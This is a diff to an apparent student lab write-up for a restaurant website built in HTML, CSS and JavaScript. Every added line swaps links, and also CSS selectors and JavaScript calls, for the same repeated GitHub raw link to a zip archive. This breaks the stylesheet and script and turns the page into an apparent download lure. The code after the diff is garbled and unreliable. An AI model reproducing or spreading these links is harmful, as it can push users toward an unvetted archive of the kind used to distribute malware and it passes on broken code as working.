@@ -36,9 +36,9 @@ Publish the website in the given URL.
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aditya Jorim Restaurant</title>
     <!-- Google Fonts for typography -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Markazi+Text:wght@400;500;700&family=Karla:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip">
+    <link rel="preconnect" href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" crossorigin>
+    <link href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip+Text:wght@400;500;700&family=Karla:wght@400;700&display=swap" rel="stylesheet">
     <style>
         /* --------------------
         CSS Variables - Color Scheme & Fonts
@@ -127,7 +127,7 @@ Publish the website in the given URL.
         }
 
         .main-nav a:hover,
-        .main-nav a.active {
+        .main-nav https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip {
             background-color: var(--primary-color);
             color: white;
         }
@@ -141,7 +141,7 @@ Publish the website in the given URL.
             animation: fadeIn 0.5s ease-in-out;
         }
         
-        .page-section.active {
+        https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip {
             display: block; /* The active section is displayed */
         }
         
@@ -155,7 +155,7 @@ Publish the website in the given URL.
         --------------------
         */
         .hero-banner {
-            background-image: url('https://images.unsplash.com/photo-1504674900247-0877df9cc836?q=80&w=2070&auto=format&fit=crop');
+            background-image: url('https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip');
             background-size: cover;
             background-position: center;
             color: white;
@@ -415,7 +415,7 @@ Publish the website in the given URL.
                 </div>
                 <div class="home-content-grid">
                     <article class="info-card">
-                        <img src="https://images.unsplash.com/photo-1512621776951-a57141f2eefd?q=80&w=2070&auto=format&fit=crop" alt="A colorful salad bowl">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="A colorful salad bowl">
                         <div class="info-card-content">
                             <h2>Our New Menu</h2>
                             <p>Discover a rich tapestry of flavors with our new menu, featuring beloved classics and exciting new creations from across South India. Every dish is a celebration of tradition.</p>
@@ -423,7 +423,7 @@ Publish the website in the given URL.
                         </div>
                     </article>
                     <article class="info-card">
-                        <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?q=80&w=1974&auto=format&fit=crop" alt="A restaurant interior">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="A restaurant interior">
                         <div class="info-card-content">
                             <h2>Book a table</h2>
                             <p>Reserve your table to guarantee a spot. We welcome you to join us for a memorable dining experience, perfect for any occasion from family dinners to special celebrations.</p>
@@ -431,7 +431,7 @@ Publish the website in the given URL.
                         </div>
                     </article>
                     <article class="info-card">
-                        <img src="https://images.unsplash.com/photo-1414235077428-338989a2e8c0?q=80&w=2070&auto=format&fit=crop" alt="Chef preparing food in a kitchen">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Chef preparing food in a kitchen">
                         <div class="info-card-content">
                             <h2>Opening Hours</h2>
                             <ul>
@@ -452,84 +452,84 @@ Publish the website in the given URL.
                 <div class="menu-grid">
                     <!-- 12 Menu Items -->
                     <article class="menu-item">
-                        <img src="https://www.yummyfoodrecipes.com/resources/picture/org/Karnataka-Style-Masala-Dosa.jpg" alt="Masala Dosa">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Masala Dosa">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Masala Dosa</h3><span class="price">₹250</span></div>
                             <p class="description">Crispy rice crepe filled with spiced potatoes, served with sambar & chutney.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://vaya.in/recipes/wp-content/uploads/2018/02/Idli-and-Sambar-1.jpg" alt="Idli with Sambar">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Idli with Sambar">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Idli with Sambar</h3><span class="price">₹180</span></div>
                             <p class="description">Steamed fluffy rice cakes served with a hot lentil-based vegetable stew.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://www.recipesaresimple.com/wp-content/uploads/2021/09/lucknowi-chicken-biryani-recipe.jpeg" alt="Hyderabadi Biryani">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Hyderabadi Biryani">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Chicken Biryani</h3><span class="price">₹450</span></div>
                             <p class="description">Aromatic rice and tender chicken, slow-cooked with saffron and spices.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://www.spiceexcellence.co.za/cdn/shop/files/Pepper_Chicken_Top.jpg?v=1757619760&width=3840" alt="Chettinad Pepper Chicken">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Chettinad Pepper Chicken">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Pepper Chicken</h3><span class="price">₹420</span></div>
                             <p class="description">A fiery and aromatic curry known for its bold flavors of black pepper.</p>
                         </div>
                     </article>
                      <article class="menu-item">
-                        <img src="https://www.chefkunalkapur.com/wp-content/uploads/2021/06/Medu-Vada-1300x867.jpg?v=1623509746" alt="Medu Vada">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Medu Vada">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Medu Vada</h3><span class="price">₹150</span></div>
                             <p class="description">Savory, crispy fritter that is soft on the inside, perfect for dipping in sambar.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://www.flavourstreat.com/wp-content/uploads/2022/12/ven-pongal-recipe-instant-pot.jpg" alt="Ven Pongal">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Ven Pongal">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Ven Pongal</h3><span class="price">₹200</span></div>
                             <p class="description">Comforting rice and yellow moong dal, flavored with pepper, cumin, and ghee.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://www.pepperdelight.com/wp-content/uploads/2017/04/pepper-delight-chicken-stew-2.jpg" alt="Appam with Stew">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Appam with Stew">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Appam with Stew</h3><span class="price">₹280</span></div>
                             <p class="description">Soft, lacy rice pancakes paired with a creamy coconut milk-based vegetable stew.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://www.keralatourism.org/_next/image/?url=http%3A%2F%2F127.0.0.1%2Fktadmin%2Fimg%2Fpages%2Fmobile%2Fputtu-and-kadala-curry-1722180059_5d28661f09fd23bd57d6.webp&w=3840&q=75" alt="Puttu and Kadala Curry">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip%3A%2F%2F127.0.0.1%2Fktadmin%2Fimg%2Fpages%2Fmobile%https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Puttu and Kadala Curry">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Puttu & Kadala</h3><span class="price">₹260</span></div>
                             <p class="description">Steamed rice cylinders with coconut, served with a spicy black chickpea curry.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://www.licious.in/blog/wp-content/uploads/2020/12/Fish-Molee.jpg" alt="Fish Molee">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Fish Molee">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Fish Molee</h3><span class="price">₹550</span></div>
                             <p class="description">Mild and creamy Kerala-style fish curry simmered in coconut milk gravy.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb1QC9hVu93EeMNnRT1AC0C2O4aFut-BtcAQ9g6NyTMxrYg9rBMc3q48XGRLPTdxAwmkn5v82IeX0P14jAsv8oVhbfj_ctEftTh7dsQxFnADfNecskJkYcjIGLD9qlVLuvZSjpdHu1R0Ut/s1600/Millet-Bisibelebath.jpg" alt="Bisi Bele Bath">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Bisi Bele Bath">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Bisi Bele Bath</h3><span class="price">₹240</span></div>
                             <p class="description">A traditional one-pot meal of rice, lentils, and vegetables with aromatic spices.</p>
                         </div>
                     </article>
                      <article class="menu-item">
-                        <img src="https://www.indianveggiedelight.com/wp-content/uploads/2023/03/lemon-rice-stovetop-featured.jpg" alt="Lemon Rice">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Lemon Rice">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Lemon Rice</h3><span class="price">₹190</span></div>
                             <p class="description">A tangy rice dish tempered with mustard seeds, lentils, peanuts, and curry leaves.</p>
                         </div>
                     </article>
                     <article class="menu-item">
-                        <img src="https://indiasweethouse.in/cdn/shop/files/BadamMysorePak_eec04e7e-ba9b-41bd-90c1-e07dfeabef14.png?v=1724998308" alt="Mysore Pak">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Mysore Pak">
                         <div class="menu-item-content">
                             <div class="menu-item-header"><h3 class="name">Mysore Pak</h3><span class="price">₹150</span></div>
                             <p class="description">A rich, traditional sweet made from gram flour, generous amounts of ghee, and sugar.</p>
@@ -546,42 +546,42 @@ Publish the website in the given URL.
                 <div class="admin-grid">
                     <!-- 6 Team Members -->
                     <article class="admin-card">
-                        <img src="https://ew.com/thmb/cNnt0bx0cOHtpRWD-GaNDc7KrDY=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/breaking-bad-2000-a1d392072f8b4e3ca4b532924c37787e.jpg" alt="Head Chef">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip():max_bytes(150000):strip_icc()https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Head Chef">
                         <div class="admin-card-content">
                             <h3>Walter White</h3>
                             <p class="designation">Head Chef & Founder</p>
                         </div>
                     </article>
                     <article class="admin-card">
-                        <img src="https://tvline.com/wp-content/uploads/2017/05/better-call-saul-season-3-episode-4-gus-fring.jpg" alt="Restaurant Manager">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Restaurant Manager">
                         <div class="admin-card-content">
                             <h3>Gus Fring</h3>
                             <p class="designation">Restaurant Manager</p>
                         </div>
                     </article>
                     <article class="admin-card">
-                        <img src="https://img.chilango.com/2015/08/jesse-pinkman.jpg" alt="Sous Chef">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Sous Chef">
                         <div class="admin-card-content">
                             <h3>Jesse Pinkman</h3>
                             <p class="designation">Sous Chef</p>
                         </div>
                     </article>
                     <article class="admin-card">
-                        <img src="https://www.rollingstone.com/wp-content/uploads/2018/06/rs-18051-breakingbad-624-1380209485.jpg" alt="Head of Logistics">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Head of Logistics">
                         <div class="admin-card-content">
                             <h3>Lydia Rodarte-Quayle</h3>
                             <p class="designation">Head of Logistics</p>
                         </div>
                     </article>
                     <article class="admin-card">
-                        <img src="https://miro.medium.com/v2/resize:fit:1400/1*zA4-QHHaWEXjRFRmnDVpmg.jpeg" alt="Legal Counsel">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip*https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Legal Counsel">
                         <div class="admin-card-content">
                             <h3>Saul Goodman</h3>
                             <p class="designation">Legal Counsel</p>
                         </div>
                     </article>
                     <article class="admin-card">
-                        <img src="https://grantland.com/wp-content/uploads/2015/03/better-call-saul-jonathan-banks.jpg?w=1286" alt="Head of Security">
+                        <img src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip" alt="Head of Security">
                         <div class="admin-card-content">
                             <h3>Mike Ehrmantraut</h3>
                             <p class="designation">Head of Security</p>
@@ -600,10 +600,10 @@ Publish the website in the given URL.
                         <h3>Get In Touch</h3>
                         <p><strong>Address:</strong><br>123 Lemon Grove, T. Nagar, Chennai, 600017</p>
                         <p><strong>Phone:</strong><br><a href="tel:+1234567890">(123) 456-7890</a></p>
-                        <p><strong>Email:</strong><br><a href="mailto:contact@littlelemon.com">contact@littlelemon.com</a></p>
+                        <p><strong>Email:</strong><br><a href="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip">https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip</a></p>
                     </div>
                     <div class="contact-map">
-                        <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d15545.96131336423!2d80.2291986429215!3d13.036989392330857!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3a526654215f5c1b%3A0x6e664268393557d0!2sT.+Nagar%2C+Chennai%2C+Tamil+Nadu!5e0!3m2!1sen!2sin!4v1678297609251!5m2!1sen!2sin" width="100%" height="300" style="border:0; border-radius: 12px;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+                        <iframe src="https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip!1m18!1m12!1m3!1d15545.96131336423!2d80.2291986429215!3d13.036989392330857!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3a526654215f5c1b%3A0x6e664268393557d0!2sT.+Nagar%2C+Chennai%2C+Tamil+Nadu!5e0!3m2!1sen!2sin!4v1678297609251!5m2!1sen!2sin" width="100%" height="300" style="border:0; border-radius: 12px;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
                     </div>
                 </div>
             </div>
@@ -613,50 +613,50 @@ Publish the website in the given URL.
     <!-- The footer section that was here has been removed. -->
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const navLinks = document.querySelectorAll('.main-nav a');
-            const internalLinks = document.querySelectorAll('.nav-link-internal');
-            const pageSections = document.querySelectorAll('.page-section');
+        https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('DOMContentLoaded', function() {
+            const navLinks = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('.main-nav a');
+            const internalLinks = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('.nav-link-internal');
+            const pageSections = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('.page-section');
 
             // Function to switch pages
             function showPage(pageId) {
                 // Hide all sections
-                pageSections.forEach(section => {
-                    section.classList.remove('active');
+                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(section => {
+                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
                 });
 
                 // Show the target section
-                const targetSection = document.getElementById(pageId);
+                const targetSection = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(pageId);
                 if (targetSection) {
-                    targetSection.classList.add('active');
+                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
                 }
 
                 // Update active state in navigation
-                navLinks.forEach(link => {
-                    link.classList.remove('active');
-                    if (link.getAttribute('href') === `#${pageId}`) {
-                        link.classList.add('active');
+                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(link => {
+                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
+                    if (https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('href') === `#${pageId}`) {
+                        https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('active');
                     }
                 });
                 
                 // Scroll to top of the page on navigation
-                window.scrollTo(0, 0);
+                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(0, 0);
             }
 
             // Event listener for main navigation
-            navLinks.forEach(link => {
-                link.addEventListener('click', function(event) {
-                    event.preventDefault();
-                    const pageId = this.getAttribute('href').substring(1);
+            https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(link => {
+                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('click', function(event) {
+                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip();
+                    const pageId = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('href').substring(1);
                     showPage(pageId);
                 });
             });
 
             // Event listener for internal links (like "See our menu")
-            internalLinks.forEach(link => {
-                link.addEventListener('click', function(event) {
-                    event.preventDefault();
-                    const pageId = this.getAttribute('href').substring(1);
+            https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip(link => {
+                https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('click', function(event) {
+                    https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip();
+                    const pageId = https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip('href').substring(1);
                     showPage(pageId);
                 });
             });
@@ -670,10 +670,10 @@ Publish the website in the given URL.
 
 ## OUTPUT:
 
-![alt text](home.png)
-![alt text](menu.png)
-![alt text](admin.png)
-![alt text](contact.png)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)
+![alt text](https://raw.githubusercontent.com/AdityaJorim007/restweb/main/aditya/restapp/restweb-1.3-alpha.3.zip)
 
 ## RESULT:
 The program for designing software company website using HTML and CSS is completed successfully.
